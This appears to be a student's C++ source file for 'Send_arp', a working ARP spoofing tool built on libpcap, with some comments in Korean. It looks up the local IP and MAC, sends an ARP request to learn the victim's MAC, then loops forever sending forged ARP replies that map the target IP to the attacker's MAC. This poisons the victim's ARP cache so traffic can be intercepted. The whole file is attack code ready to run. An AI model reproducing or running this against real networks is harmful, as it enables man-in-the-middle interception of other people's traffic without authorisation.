#include<iostream>
#include<pcap.h>
#include<cmath>
#include<sys/ioctl.h>
#include<sys/socket.h>
#include<net/if.h>
#include<netinet/ether.h>
#include <netinet/in.h>
#include<arpa/inet.h>
#include <stdlib.h>
#include<unistd.h>
#include<netinet/in.h>
#include<string.h>

#include "packet_structure.h"

using namespace std;
int usage(){
    cerr<<"Syntax: Send_arp <interface><sender IP><target IP>\n";
    cerr<<"Sample: Send_arp wlan0 192.168.10.2 102.160.10.1\n";
    return -1;
}

//uint8_t My_MAC[6];
//uint8_t My_IP[4];

void GET_MY_IP_MAC(char * dev, uint8_t * ip_attacker, uint8_t * mac_attacker)
{
    //dev==interface input
    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr); // ???????

    close(fd);
    memcpy(ip_attacker, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);
/*************************************************************************************************/

    // MAC 주소 가져오는 부분인데 공부 해야 할듯. 이해 불가

    /*        Get my Mac Address      */
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    ifreq* it = ifc.ifc_req;
    const ifreq* const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
      strcpy(ifr.ifr_name, it->ifr_name);
      if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
      {
              if (! (ifr.ifr_flags & IFF_LOOPBACK)) // don't count loopback
              {
                      if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                      {
                              success = true;
                              break;
                      }
              }
      }
      else { /* handle error */ }
    }
    if (success) memcpy(mac_attacker, ifr.ifr_hwaddr.sa_data, 6);
}


//Suppose victim's ip is given.
int main(int argc, char* argv[]){

    if(argc!=4){//Wrong input format
        usage();
        return -1;
    }
    //getting my mac addr
    uint8_t My_MAC[6];
    uint8_t My_IP[4];
    char * dev = argv[1];
    const char * sender_ip_str = argv[2];
    const char * target_ip_str = argv[3];
    GET_MY_IP_MAC(dev, My_IP, My_MAC);
    cout<<"MAC ADDr: ";
    for(int i=0;i<6;i++){
        printf("%02X: ", My_MAC[i]);
    }
    //detecting victim's mac addr
    uint8_t Sender_IP[4];
    uint8_t Target_IP[4];
    inet_pton(AF_INET, sender_ip_str, Sender_IP);
    inet_pton(AF_INET, target_ip_str, Target_IP);
    uint8_t Sender_MAC[6];

    cout<<"target: ";
    for(int i=0;i<4;i++)
    {
        printf("%02X ", Target_IP[i]);
    }

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle=pcap_open_live(dev,BUFSIZ,1, 1000, errbuf);
    if(handle==NULL){
        cerr<<"Couldn't open device\n"; return -1;
    }

    char * arp_req = (char*)malloc(sizeof(char) * 42);

    Ethernet_Header * eth = (Ethernet_Header *)arp_req;

    ARP_Header * arp = (ARP_Header *)(arp_req + 14);


    //Ethernet header
    memset(eth->D_addr, 0xff, 6);
    memcpy(eth->S_addr,My_MAC,6);
    eth->type = htons(0x0806);

    //ARP header
    arp->H_type = htons(0x0001);
    arp->P_type = htons(0x0800);
    arp->H_A_length = 0x06;
    arp->P_A_length = 0x04;
    arp->OPcode=htons(0x0001);
    memcpy(arp->S_H_addr,My_MAC,6);
    memcpy(arp->S_P_addr,My_IP,4);
    memset(arp->D_H_addr,0x00,6);
    memcpy(arp->D_P_addr,Sender_IP,4);


    while(1)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        pcap_sendpacket(handle, (u_char *)arp_req, 42);

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        Ethernet_Header * eth_check = (Ethernet_Header*)packet;

        if(memcmp(eth_check->D_addr,My_MAC,6) || ntohs(eth_check->type) != 0x0806)
        {
            continue;
        }

        // DMAC == mymac?) memcmp
        // e_type == 0x0806  ntohs(eth_chect->e_type)

        ARP_Header * arp_check = (ARP_Header *)(packet + 14);

        if(memcmp(arp_check->S_P_addr, Sender_IP, 4) || ntohs(arp_check->OPcode) != 0x0002)
        {
            continue;
        }
        // Sip == sender_ip?  memcmp(arp_check->Sip, sender_ip, 4)
        // oper == 0x0002   ntohs(oper~~)

        memcpy(Sender_MAC, eth_check->S_addr,6);
        break;
    }



    char * arp_rep = (char*)malloc(sizeof(char) * 42);

    Ethernet_Header * eth2 = (Ethernet_Header *)arp_rep;

    ARP_Header * arp2 = (ARP_Header *)(arp_rep + 14);


    //Ethernet header
    memcpy(eth2->D_addr, Sender_MAC, 6);
    memcpy(eth2->S_addr,My_MAC,6);
    eth2->type = htons(0x0806);

    //ARP header
    arp2->H_type = htons(0x0001);
    arp2->P_type = htons(0x0800);
    arp2->H_A_length = 0x06;
    arp2->P_A_length = 0x04;
    arp2->OPcode=htons(0x0002);
    memcpy(arp2->S_H_addr,My_MAC,6);
    memcpy(arp2->S_P_addr,Target_IP,4);
    memcpy(arp2->D_H_addr,Sender_MAC,6);
    memcpy(arp2->D_P_addr,Sender_IP,4);

    while(1)
    {
        pcap_sendpacket(handle, (u_char*)arp_rep, 42);
        sleep(2);
    }
    //Sending arp packet
    return 0;
}
